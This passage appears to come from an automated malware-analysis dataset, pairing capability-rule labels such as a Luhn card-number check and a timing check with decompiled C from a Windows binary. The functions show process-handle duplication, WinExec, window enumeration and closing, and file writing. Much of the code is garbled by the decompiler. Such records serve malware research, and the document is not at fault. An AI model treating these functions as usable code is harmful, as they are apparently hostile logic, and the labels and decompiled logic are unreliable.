        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004027cc) overlaps instruction at (ram,0x004027c9)\n// \n\nuint fcn.00402780(uint param_1, uint param_2)\n\n{\n    uint8_t *puVar1;\n    uint arg_8h;\n    uint arg_ch;\n    int32_t iVar2;\n    bool bVar3;\n    \n    arg_ch = param_2;\n    arg_8h = param_1;\n    iVar2 = fcn.004016c0(param_1, param_2, &param_1, &param_2);\n    bVar3 = iVar2 == 0;\n    if (bVar3) {\n        return 0;\n    }\n    if ((!bVar3) && (bVar3)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    *(iVar2 + 0x58) = param_2;\n    puVar1 = (CONCAT31(&param_2 >> 8, 0x98) | 0x8d) + 0x51;\n    *puVar1 = *puVar1 | param_2;\n    fcn.004016c0(arg_8h, arg_ch, &param_1, &param_2);\n    return 1;\n}\n",
        "token_count": 289
    },
    "004027f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004027ff) overlaps instruction at (ram,0x004027fd)\n// \n// WARNING: Removing unreachable block (ram,0x00402835)\n// WARNING: Removing unreachable block (ram,0x00402843)\n// WARNING: Removing unreachable block (ram,0x00402845)\n// WARNING: Removing unreachable block (ram,0x004027ff)\n\nuint32_t __cdecl fcn.004027f0(uint arg_8h)\n\n{\n    uint32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t extraout_ECX;\n    uint8_t in_CF;\n    uint8_t in_AF;\n    uchar in_ZF;\n    uchar in_OF;\n    \n    while( true ) {\n        if ((!in_CF && !in_ZF) && (in_CF || in_ZF)) {\n            if (in_OF) {\n                return in_EAX;\n            }\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        iVar1 = fcn.004018a0(0x407080);\n        if (iVar1 == -1) {\n            return 0;\n        }\n        uVar2 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x40, 0, iVar1);\n        in_OF = false;\n        in_ZF = uVar2 == 0;\n        if (in_ZF) break;\n        if ((uVar2 < 1) || (0 < uVar2)) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(arg_8h, uVar2, 0, 0, 0, 2);\n            iVar1 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar3);\n            if (iVar1 != 0) {\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar2);\n                return 1;\n            }\n            return 0;\n        }\n        in_CF = 9 < (uVar2 & 0xf) | in_AF;\n        in_EAX = uVar2 & 0xffff0000 | CONCAT11((uVar2 >> 8) + in_CF, uVar2 + in_CF * '\\x06') & 0xff0f;\n        in_AF = in_CF;\n        if (extraout_ECX != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\n    return 0;\n}\n",
        "token_count": 565
    },
    "00402cf0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402d4a) overlaps instruction at (ram,0x00402d46)\n// \n// WARNING: Removing unreachable block (ram,0x00402d3d)\n// WARNING: Variable defined which should be unmapped: var_213h\n\nint32_t __cdecl fcn.00402cf0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint unaff_EBX;\n    int32_t iVar3;\n    uint unaff_ESI;\n    uchar uVar4;\n    uint unaff_EDI;\n    uint *puVar5;\n    uchar *noname_6;\n    uint uVar6;\n    uchar lpBuffer;\n    uint var_213h;\n    uint in_stack_fffffdf0;\n    uint in_stack_fffffdf4;\n    uint in_stack_fffffdf8;\n    uint in_stack_fffffdfc;\n    uint in_stack_fffffe00;\n    uint in_stack_fffffe04;\n    uint in_stack_fffffe08;\n    uchar s;\n    uint var_10fh;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    _lpBuffer = _lpBuffer & 0xffffff00;\n    puVar5 = &var_213h;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    s = 0;\n    puVar5 = &var_10fh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    var_ch = 1;\n    *(puVar5 + 2) = 0;\n    noname_6 = &lpBuffer;\n    // WARNING: Bad instruction - Truncating control flow here\n    uVar6 = 0x104;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)(0xec, 0x34, 0xe8, arg_8h);\n    fcn.00404c50(&var_4h, &var_8h);\n    iVar2 = fcn.00401ec0(arg_8h, arg_ch, arg_10h, arg_14h, var_4h, var_8h, noname_6, uVar6, unaff_EDI, unaff_ESI, \n                         unaff_EBX, _lpBuffer, stack0xfffffdec, in_stack_fffffdf0, in_stack_fffffdf4, in_stack_fffffdf8\n                         , in_stack_fffffdfc, in_stack_fffffe00, in_stack_fffffe04, in_stack_fffffe08);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    *0x4214f8 = fcn.004011b0();\n    iVar2 = fcn.004028d0(&s, var_4h, var_8h);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar3 = *0x5217b43a;\n    fcn.004021d0();\n    iVar2 = fcn.004018a0(0x40706c);\n    if (iVar2 == -1) {\n        iVar2 = fcn.004018a0(0x407060);\n        if (iVar2 == -1) {\n            uVar6 = *(iVar3 + 8);\n            goto code_r0x00402efb;\n        }\n        uVar4 = 0xf;\n    }\n    else {\n        uVar4 = 0xe;\n    }\n    uVar6 = *(iVar3 + 8);\n    iVar2 = fcn.00401680(uVar6);\n    if (iVar2 != 0) {\n        fcn.00402490(uVar4);\n        fcn.004010f0(uVar4);\n        return 1;\n    }\n    if (*0x4214f8 == 0) {\n        return 0;\n    }\ncode_r0x00402efb:\n    iVar2 = fcn.00401e30(uVar6, iVar3 + -0x110);\n    if (iVar2 == 0) {\n        iVar2 = 0;\n    }\n    else {\n        iVar2 = *(iVar3 + -0xc);\n    }\n    if ((iVar2 != 0) && (iVar1 = fcn.00401b20(uVar6),  iVar1 == 0)) {\n        *(iVar3 + -0xc) = 0;\n        iVar2 = iVar1;\n    }\n    if (iVar2 == 0) {\n        iVar2 = fcn.00402310(uVar6, 0);\n        *(iVar3 + -0xc) = iVar2;\n    }\n    if (iVar2 != 0) {\n        fcn.004010f0();\n    }\n    (*_sym.imp.KERNEL32.dll_Sleep)();\n    (*_sym.imp.KERNEL32.dll_WinExec)(0x80, 0);\n    return iVar2;\n}\n",
        "token_count": 1216
    },
    "00403140": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403140(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_wcslen)(param_1);\n    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, iVar1 + 1, param_2, param_3, 0, 0);\n    return;\n}\n",
        "token_count": 102
    },
    "00403320": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00403320(int32_t *arg_8h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint *puVar8;\n    uint *puVar9;\n    uint *in_FS_OFFSET;\n    bool bVar10;\n    uint *puStack620;\n    uint uStack616;\n    uint uStack612;\n    uint uStack608;\n    uint var_24ch;\n    uchar var_148h;\n    uint var_147h;\n    uint32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t pbstr;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    uint uStack12;\n    int32_t var_4h;\n    \n    puVar9 = &stack0xfffffffc;\n    var_4h = 0xffffffff;\n    uStack12 = 0x4052c0;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00403320::var_ch;\n    uStack608 = 0;\n    uStack612 = 0x403349;\n    (*_sym.imp.ole32.dll_CoInitialize)();\n    uStack612 = 0x4073fc;\n    uStack616 = 0x403354;\n    uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)();\n    bVar10 = (POPCOUNT(uVar2 & 0xff) & 1U) == 0;\n    if (uVar2 == 0) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    uStack616 = 0x407408;\n    puStack620 = 0x40337e;\n    var_44h = uVar2;\n    uVar3 = (*_sym.imp.USER32.dll_RegisterWindowMessageA)();\n    if ((!bVar10) && (bVar10)) {\n        puVar8 = &stack0xfffffd94;\n        cVar1 = '\\x1e';\n        do {\n            puVar9 = puVar9 + -1;\n            puVar8 = puVar8 + -1;\n            *puVar8 = *puVar9;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n        iVar4 = in(0x78);\n        return iVar4;\n    }\n    puStack620 = &fcn.00403320::var_18h;\n    (*_sym.imp.USER32.dll_SendMessageTimeoutA)(arg_8h, uVar3, 0, 0, 2, 1000);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2, 0x40741c);\n    if (pcVar5 == NULL) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_20h = NULL;\n    var_4h = 0;\n    iVar4 = (*pcVar5)(var_18h, str._D_3, 0, &fcn.00403320::var_20h);\n    if ((iVar4 < 0) || (var_20h == NULL)) {\n        var_4h = 0xffffffff;\n        if (var_20h != NULL) {\n            (**(*var_20h + 8))(var_20h);\n        }\n    }\n    else {\n        var_24h = NULL;\n        var_4h._0_1_ = 1;\n        iVar4 = (**(*var_20h + 0x20))(var_20h, &fcn.00403320::var_24h);\n        if ((iVar4 < 0) || (var_24h == NULL)) {\n            var_4h = var_4h._1_3_ << 8;\n            if (var_24h != NULL) {\n                (**(*var_24h + 8))(var_24h);\n            }\n            var_4h = 0xffffffff;\n            if (var_20h != NULL) {\n                (**(*var_20h + 8))(var_20h);\n            }\n        }\n        else {\n            var_1ch = 0;\n            (**(*var_24h + 0x24))(var_24h, &fcn.00403320::var_1ch);\n            var_40h = 0;\n            if (0 < var_1ch) {\n                do {\n                    var_2ch = (*_sym.imp.MSVCRT.dll_rand)();\n                    var_2ch = var_2ch % var_1ch;\n                    var_34h = CONCAT22(var_34h._2_2_, 3);\n                    arg_8h = NULL;\n                    var_10h = NULL;\n                    var_4h._0_1_ = 4;\n                    iVar4 = (**(*var_24h + 0x2c))\n                                      (var_24h, var_34h, var_30h, var_2ch, var_28h, var_34h, var_30h, var_2ch, var_28h, \n                                       &fcn.00403320::arg_8h);\n                    if ((iVar4 < 0) || (arg_8h == NULL)) {\n                        var_4h._0_1_ = 3;\n                        if (var_10h != NULL) {\n                            (**(*var_10h + 8))(var_10h);\n                        }\njoined_r0x00403755:\n                        var_4h._0_1_ = 2;\n                        if (arg_8h != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*arg_8h + 8))(arg_8h);\n                        }\ncode_r0x00403761:\n                        (*_sym.imp.OLEAUT32.dll_VariantCopy)(&fcn.00403320::var_34h);\n                        break;\n                    }\n                    iVar4 = (***arg_8h)(arg_8h, 0x4061b0, &fcn.00403320::var_10h);\n                    if (((iVar4 < 0) || (var_10h == NULL)) ||\n                       (iVar4 = (**(*var_10h + 0x38))(var_10h, &fcn.00403320::pbstr),  iVar4 < 0)) {\njoined_r0x0040371c:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (arg_8h != NULL) {\n                            (**(*arg_8h + 8))(arg_8h);\n                        }\n                        goto code_r0x00403761;\n                    }\n                    if (pbstr == 0) {\njoined_r0x00403558:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (arg_8h != NULL) {\n                            (**(*arg_8h + 8))(arg_8h);\n                        }\n                    }\n                    else {\n                        fcn.00403140(pbstr, &fcn.00403320::var_24ch, 0x104);\n                        (*_sym.imp.OLEAUT32.dll_SysStringLen)(pbstr);\n                        iVar6 = (*_sym.imp.MSVCRT.dll__stricmp)(&fcn.00403320::var_24ch, 0x407430);\n                        if (iVar6 != 0) goto joined_r0x00403558;\n                        var_14h = NULL;\n                        var_4h._0_1_ = 5;\n                        iVar4 = (***arg_8h)(arg_8h, 0x4061a0, &fcn.00403320::var_14h);\n                        if ((iVar4 < 0) || (var_14h == NULL)) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\njoined_r0x00403701:\n                            if (var_10h != NULL) {\n                                var_4h._0_1_ = 3;\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                            goto joined_r0x00403755;\n                        }\n                        iVar4 = (**(*var_14h + 0x20))(var_14h, &fcn.00403320::var_3ch);\n                        iVar6 = var_3ch;\n                        if (iVar4 < 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            goto joined_r0x00403701;\n                        }\n                        if (var_3ch == 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        else {\n                            var_148h = 0;\n                            puVar9 = &fcn.00403320::var_147h;\n                            for (iVar7 = 0x40; iVar7 != 0; iVar7 = iVar7 + -1) {\n                                *puVar9 = 0;\n                                puVar9 = puVar9 + 1;\n                            }\n                            *puVar9 = 0;\n                            *(puVar9 + 2) = 0;\n                            fcn.00403140(iVar6, &stack0xfffffeb4, 0x104);\n                            (*_sym.imp.OLEAUT32.dll_SysStringLen)(var_3ch);\n                            iVar6 = fcn.00403250(&stack0xfffffeb4);\n                            if (iVar6 == 0) {\n                                (*_sym.imp.KERNEL32.dll_Sleep)(10);\n                                (**(*var_10h + 0x114))(var_10h);\n                                var_4h._0_1_ = 4;\n                                if (var_14h != NULL) {\n                                    (**(*var_14h + 8))(var_14h);\n                                }\n                                goto joined_r0x0040371c;\n                            }\n                            (*_sym.imp.KERNEL32.dll_Sleep)(0);\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        var_4h._0_1_ = 2;\n                        if (arg_8h != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*arg_8h + 8))(arg_8h);\n                        }\n                    }\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(&fcn.00403320::var_34h);\n                    var_40h = var_40h + 1;\n                } while (var_40h < var_1ch);\n            }\n            var_4h = var_4h._1_3_ << 8;\n            if (var_24h != NULL) {\n                (**(*var_24h + 8))(var_24h);\n            }\n            var_4h = 0xffffffff;\n            uVar2 = var_44h;\n            if (var_20h != NULL) {\n                (**(*var_20h + 8))(var_20h);\n                uVar2 = var_44h;\n            }\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_FreeLibrary)(uVar2);\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    *in_FS_OFFSET = var_ch;\n    return iVar4;\n}\n",
        "token_count": 2848
    },
    "null": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00403880": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403880(uint arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    bool bVar5;\n    uchar *puStack304;\n    uchar *puStack300;\n    uchar var_108h;\n    uint var_107h;\n    int32_t var_4h;\n    \n    puStack304 = &stack0xfffffffc;\n    puVar3 = &stack0xfffffffc;\n    puStack300 = &stack0xfffffee8;\n    (*_sym.imp.USER32.dll_GetWindowThreadProcessId)();\n    if (arg_ch != var_4h) {\n        return 1;\n    }\n    var_108h = 0;\n    puVar4 = &fcn.00403880::var_107h;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    puStack304 = 0x4038ec;\n    puStack300 = arg_8h;\n    (*_sym.imp.USER32.dll_GetClassNameA)();\n    puStack304 = 0x4073d8;\n    iVar2 = (*_sym.imp.MSVCRT.dll__stricmp)(&stack0xfffffef4);\n    bVar5 = iVar2 != 0;\n    if (!bVar5) {\n        if ((bVar5) && (!bVar5)) {\n            puVar4 = &stack0xfffffed0;\n            cVar1 = '\\x10';\n            do {\n                puVar3 = puVar3 + -1;\n                puVar4 = puVar4 + -1;\n                *puVar4 = *puVar3;\n                cVar1 = cVar1 + -1;\n                puStack304 = &stack0xfffffffc;\n            } while ('\\0' < cVar1);\n        }\n        (*_sym.imp.USER32.dll_EnumChildWindows)(arg_8h, 0x403800, 0);\n        iVar2 = (*_sym.imp.MSVCRT.dll_rand)();\n        (*_sym.imp.KERNEL32.dll_Sleep)((iVar2 % 10 + 4) * 1000);\n        (*_sym.imp.USER32.dll_PostMessageA)(arg_8h, 0x10, 0, 0);\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 582
    },
    "00404140": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004042ab) overlaps instruction at (ram,0x004042aa)\n// \n// WARNING: Removing unreachable block (ram,0x00404205)\n// WARNING: Removing unreachable block (ram,0x004043d5)\n\nvoid fcn.00404140(void)\n\n{\n    uchar uVar1;\n    uint8_t uVar2;\n    int16_t iVar3;\n    uint16_t extraout_CX;\n    char extraout_CH;\n    int32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    int32_t unaff_EBX;\n    uint32_t unaff_EBP;\n    uchar *puVar4;\n    uint16_t in_ES;\n    ushort in_SS;\n    bool bVar5;\n    uint8_t in_AF;\n    char cVar6;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    char cVar7;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint32_t arg_14h;\n    uint in_stack_ffffffdc;\n    ushort uVar9;\n    uint8_t *puVar8;\n    uint32_t uVar10;\n    uint arg_10h;\n    uint arg_14h_00;\n    \n    uVar9 = in_stack_ffffffdc >> 0x10;\n    fcn.00401800(0x407494, 0xf, 0x407014, 0x11);\n    puVar8 = CONCAT22(uVar9, in_SS);\n    fcn.00401800(0x407494, 0xf, 0x407230, 0x47);\n    fcn.00401800(0x407494, 0xf, 0x407240, 0x1a);\n    cVar7 = '\\0';\n    cVar6 = '\\0';\n    arg_14h_00 = 0x407294;\n    arg_10h = 0xf;\n    uVar10 = 0x407494;\n    uVar1 = fcn.00401800(0x407494, 0xf, 0x407294, 10);\n    if ((cVar7 == cVar6) && (cVar7 != cVar6)) {\n        uVar10 = uVar10 & 0xffff0000 | in_ES;\n        puVar4 = puVar8 | unaff_EBP;\n        puVar8 = puVar4 + 1;\n        *puVar4 = uVar1;\n    }\n    while( true ) {\n        fcn.00401800(0x407494, uVar10, arg_10h, arg_14h_00);\n        fcn.00401800(0x407494, 0xf, 0x4072ac, 8);\n        fcn.00401800(0x407494, 0xf, 0x4072b4, 9);\n        fcn.00401800(0x407494, 0xf, 0x4072c0, 9);\n        fcn.00401800(0x407494, 0xf, 0x4072cc, 9);\n        fcn.00401800(0x407494, 0xf, 0x4072d8, 0xc);\n        bVar5 = (POPCOUNT(unaff_EBX & extraout_CX & 0xff) & 1U) == 0;\n        fcn.00401800(0x407494, 0xf, 0x4072e4, 3);\n        if ((bVar5) || (!bVar5)) break;\n        *(extraout_EDX + 10) = *(extraout_EDX + 10) + -0x68;\n        arg_14h_00 = 0x404311;\n        func_0x6a408383();\n        *(unaff_EBX + -0x7e9fdf3c) = *(unaff_EBX + -0x7e9fdf3c) + 1;\n    }\n    fcn.00401800(0x407494, 0xf, 0x4072e8, 10);\n    uVar1 = extraout_CH - 1U < 5;\n    fcn.00401800(0x407494, 0xf, 0x4072f4, 0x40);\n    uVar10 = 0x40436d;\n    uVar2 = fcn.00401800(0x407494, 0xf, 0x407334, 0xc);\n    if ((uVar1) || (uVar10 = uVar10 & 0xffff | puVar8 << 0x10,  !uVar1)) {\n        uVar10 = 0xb;\n    }\n    cVar6 = uVar2 - *puVar8;\n    arg_14h = (in_NT & 1) * 0x4000 | SBORROW1(uVar2, *puVar8) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n              (cVar6 < '\\0') * 0x80 | (cVar6 == '\\0') * 0x40 | (in_AF & 1) * 0x10 | ((POPCOUNT(cVar6) & 1U) == 0) * 4 |\n              uVar2 < *puVar8 | (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 |\n              (in_AC & 1) * 0x40000;\n    func_0x1018a2f7(arg_14h, uVar10);\n    iVar3 = fcn.00401800(0x407494, 0xf, 0x407340, arg_14h);\n    cVar7 = SCARRY2(iVar3, 1);\n    cVar6 = iVar3 + 1 < 0;\n    uVar1 = fcn.00401800(0x407494, 0xf, 0x40734c, 4);\n    if ((cVar7 == cVar6) && (cVar7 != cVar6)) {\n        *(puVar8 + 1 | extraout_EDX_00 + 0xbU) = uVar1;\n    }\n    fcn.00401800(0x407494, 0xf, 0x407350, 4);\n    fcn.00401800(0x407494, 0xf, 0x407354, 0xc);\n    fcn.00401800(0x407494, 0xf, 0x407360, 4);\n    fcn.00401800(0x407494, 0xf, 0x407364, 9);\n    fcn.00401800(0x407494, 0xf, 0x407370, 0x16);\n    fcn.00401800(0x407494, 0xf, 0x407388, 7);\n    return;\n}\n",
        "token_count": 1611
    },
    "00404790": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004047a5) overlaps instruction at (ram,0x004047a3)\n// \n\nint32_t fcn.00404790(void)\n\n{\n    code *pcVar1;\n    int32_t unaff_ESI;\n    char in_SF;\n    char in_OF;\n    \n    if ((in_OF == in_SF) && (in_OF != in_SF)) {\n        pcVar1 = sym.imp.MSVCRT.dll_rand + unaff_ESI;\n    }\n    else {\n        pcVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    }\n    return pcVar1 % 5 + 3;\n}\n",
        "token_count": 143
    },
    "00404970": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open file",
            "write file on Windows"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004049b3) overlaps instruction at (ram,0x004049af)\n// \n\nuint __cdecl fcn.00404970(uint filename, uint mode, uint ptr, uint nitems)\n\n{\n    int32_t iVar1;\n    int32_t extraout_ECX;\n    bool bVar2;\n    char cVar3;\n    char cVar4;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_fopen)(filename, mode);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    cVar4 = SBORROW4(iVar1, extraout_ECX);\n    cVar3 = iVar1 - extraout_ECX < 0;\n    bVar2 = iVar1 == extraout_ECX;\n    (*_sym.imp.MSVCRT.dll_fwrite)(ptr, 1, nitems, iVar1);\n    if ((bVar2 || cVar4 != cVar3) || (!bVar2 && cVar4 == cVar3)) {\n        (*_sym.imp.MSVCRT.dll_fflush)(iVar1);\n    }\n    (*_sym.imp.MSVCRT.dll_fclose)(iVar1);\n    return 1;\n}\n",
        "token_count": 266
    },
    "004049e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404bf4) overlaps instruction at (ram,0x00404bf1)\n// \n// WARNING: Removing unreachable block (ram,0x00404a7f)\n// WARNING: Removing unreachable block (ram,0x00404aae)\n// WARNING: Removing unreachable block (ram,0x00404b47)\n// WARNING: Removing unreachable block (ram,0x00404b6b)\n\nulong __cdecl fcn.004049e0(uchar *arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint16_t uVar2;\n    uint16_t in_AX;\n    uint16_t uVar3;\n    uint uVar4;\n    uint32_t in_ECX;\n    uint32_t in_EDX;\n    uint *puVar5;\n    uint *puVar6;\n    uint *puVar7;\n    uint32_t unaff_ESI;\n    char *unaff_EDI;\n    char *pcVar8;\n    bool bVar9;\n    bool bVar10;\n    uint auStack24175 [6023];\n    uchar *puStack80;\n    ushort uStack28;\n    uint16_t uStack26;\n    ushort uStack24;\n    ushort uStack22;\n    uint16_t uStack20;\n    ushort uStack18;\n    \n    puVar5 = &stack0xfffffffc;\n    puVar7 = &stack0xfffffffc;\n    uStack28 = in_ECX;\n    uStack26 = in_ECX >> 0x10;\n    uStack20 = in_AX;\n    while( true ) {\n        uVar2 = uStack20;\n        uVar3 = uStack26;\n        *arg_8h = 0xb3;\n        uStack26 = unaff_ESI;\n        arg_8h[1] = 0xc2;\n        arg_8h[2] = 0x4f;\n        arg_8h[3] = 0x2a;\n        uStack20 = in_EDX;\n        uStack24 = SUB42(unaff_EDI, 0);\n        uStack22 = unaff_EDI >> 0x10;\n        bVar9 = (uVar2 & 0x11cb) == 0;\n        arg_8h[4] = 8;\n        if ((bVar9) || (!bVar9)) break;\n        if ((uVar3 << 0x10 | in_ECX & 0xffff) != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\n    arg_8h[5] = 0x4c;\n    arg_8h[6] = 0x51;\n    uStack18 = uStack28;\n    bVar9 = (POPCOUNT((in_ECX & 0xffff) >> 8 ^ arg_8h) & 1U) == 0;\n    arg_8h[7] = 0x82;\n    arg_8h[8] = 0x22;\n    if ((!bVar9) && (bVar9)) {\n        puVar7 = &stack0xfffffff0;\n        cVar1 = '\\x1e';\n        do {\n            puVar5 = puVar5 + -1;\n            puVar7 = puVar7 + -1;\n            *puVar7 = *puVar5;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n        uVar4 = in(0x78);\n        return CONCAT44(in_EDX, uVar4);\n    }\n    arg_8h[9] = 0xd8;\n    if ((bVar9) || (!bVar9)) {\n        arg_8h[10] = 0x66;\n    }\n    puVar5 = &stack0xfffffff4;\n    arg_8h[0xb] = 0x56;\n    uStack20 = unaff_ESI + 0x43;\n    uStack18 = unaff_ESI + 0x43 >> 0x10;\n    uVar3 = uStack26 + arg_8h | 0x11a9;\n    bVar10 = uVar3 < 0;\n    bVar9 = uVar3 == 0;\n    arg_8h[0xc] = 0xa9;\n    if ((!bVar10) && (bVar10)) {\n        pcVar8 = unaff_EDI | &stack0xfffffffc;\n        unaff_EDI = pcVar8 + 1;\n        *pcVar8 = unaff_ESI;\n        in_EDX = in_EDX & 0xffffff00;\n        uVar3 = unaff_ESI + (unaff_ESI >> 8) * 'y';\n        unaff_ESI = uVar3;\n        bVar10 = false;\n        bVar9 = uVar3 == 0;\n    }\n    arg_8h[0xd] = 0x76;\n    puVar6 = &stack0xfffffffc;\n    if ((!bVar9) && (puVar6 = &stack0xfffffffc,  bVar9)) {\n        cVar1 = '\\x10';\n        do {\n            puVar7 = puVar7 + -1;\n            puVar5 = puVar5 + -1;\n            *puVar5 = *puVar7;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n        puStack80 = &stack0xfffffff4;\n        puVar6 = &stack0xfffffff4;\n    }\n    arg_8h[0xe] = 0x30;\n    arg_8h[0xf] = 0x53;\n    if ((!bVar10) && (bVar10)) {\n        *(unaff_EDI | puVar6) = unaff_ESI;\n        in_EDX = in_EDX & 0xffffff00;\n        unaff_ESI = unaff_ESI + (unaff_ESI >> 8) * 'y';\n    }\n    arg_8h[0x10] = 0xe7;\n    puVar5 = auStack24175 + 1;\n    arg_8h[0x11] = 0x5d;\n    bVar9 = (unaff_ESI & 0x11cb) == 0;\n    arg_8h[0x12] = 0xd5;\n    puVar7 = puVar6;\n    if ((!bVar9) && (bVar9)) {\n        cVar1 = '\\x10';\n        do {\n            puVar6 = puVar6 + -1;\n            puVar5 = puVar5 + -1;\n            *puVar5 = *puVar6;\n            cVar1 = cVar1 + -1;\n            puVar7 = auStack24175 + 1;\n        } while 